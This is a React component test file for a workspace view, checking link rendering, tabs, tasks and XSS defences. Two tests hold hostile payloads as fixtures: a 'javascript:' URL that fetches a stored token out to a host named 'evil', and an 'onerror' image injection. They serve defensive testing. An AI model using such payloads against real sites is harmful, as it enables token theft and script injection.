/**
 * Copyright (c) 2026 VitruvianSoftware
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

import { render, screen, fireEvent } from "@testing-library/react";
import type { Workspace } from "@tabula/shared";
import { SpaceView } from "@/app/components/space/SpaceView";

const space = (overrides: Partial<Workspace> = {}): Workspace => ({
  id: "ws_1",
  name: "Shared Space",
  description: "A space shared with me",
  position: 0,
  tabs: [],
  resources: [],
  sections: [],
  notes: [],
  tasks: [],
  createdAt: 0,
  updatedAt: 0,
  ...overrides,
});

describe("SpaceView", () => {
  it("renders the space name and description", () => {
    render(<SpaceView space={space()} />);
    expect(screen.getByText("Shared Space")).toBeInTheDocument();
    expect(screen.getByText("A space shared with me")).toBeInTheDocument();
  });

  it("renders a safe http(s) resource as a real link", () => {
    render(
      <SpaceView
        space={space({
          resources: [
            {
              id: "r1",
              title: "Example",
              url: "https://example.com/page",
              createdAt: 0,
            },
          ],
        })}
      />,
    );
    const link = screen.getByRole("link", { name: /Example/ });
    expect(link).toHaveAttribute("href", "https://example.com/page");
    expect(link).toHaveAttribute("rel", expect.stringContaining("noopener"));
  });

  it("renders a javascript:/data: resource URL inert (no href) — XSS guard", () => {
    render(
      <SpaceView
        space={space({
          resources: [
            {
              id: "r1",
              title: "Evil",
              url: "javascript:fetch('//evil/'+localStorage.tabula_token)",
              createdAt: 0,
            },
          ],
        })}
      />,
    );
    // The title still shows, but it is NOT a link (no href to execute).
    expect(screen.getByText("Evil")).toBeInTheDocument();
    expect(screen.queryByRole("link", { name: /Evil/ })).toBeNull();
  });

  it("renders note bodies as escaped text, never as markup", () => {
    render(
      <SpaceView
        space={space({
          notes: [
            {
              id: "n1",
              title: "Note",
              content: "<img src=x onerror=alert(1)>",
              updatedAt: 0,
            },
          ],
        })}
      />,
    );
    fireEvent.click(screen.getByRole("tab", { name: /Notes/ }));
    // The raw string is shown verbatim (escaped); no <img> element is created.
    expect(
      screen.getByText("<img src=x onerror=alert(1)>"),
    ).toBeInTheDocument();
    expect(document.querySelector("img")).toBeNull();
  });

  it("shows completed tasks struck-through with a disabled checkbox", () => {
    render(
      <SpaceView
        space={space({
          tasks: [
            { id: "t1", title: "Done", completed: true, createdAt: 0 },
            { id: "t2", title: "Todo", completed: false, createdAt: 0 },
          ],
        })}
      />,
    );
    fireEvent.click(screen.getByRole("tab", { name: /Tasks/ }));
    const done = screen.getByLabelText("Done") as HTMLInputElement;
    expect(done.checked).toBe(true);
    expect(done.disabled).toBe(true);
  });

  it("switches between Resources / Notes / Tasks tabs", () => {
    render(
      <SpaceView
        space={space({
          notes: [{ id: "n1", title: "MyNote", content: "x", updatedAt: 0 }],
        })}
      />,
    );
    // Notes hidden until the tab is selected.
    expect(screen.queryByText("MyNote")).toBeNull();
    fireEvent.click(screen.getByRole("tab", { name: /Notes/ }));
    expect(screen.getByText("MyNote")).toBeInTheDocument();
  });

  it("shows an empty state when a tab has no content", () => {
    render(<SpaceView space={space()} />);
    expect(screen.getByText(/No resources in this space/)).toBeInTheDocument();
  });
});
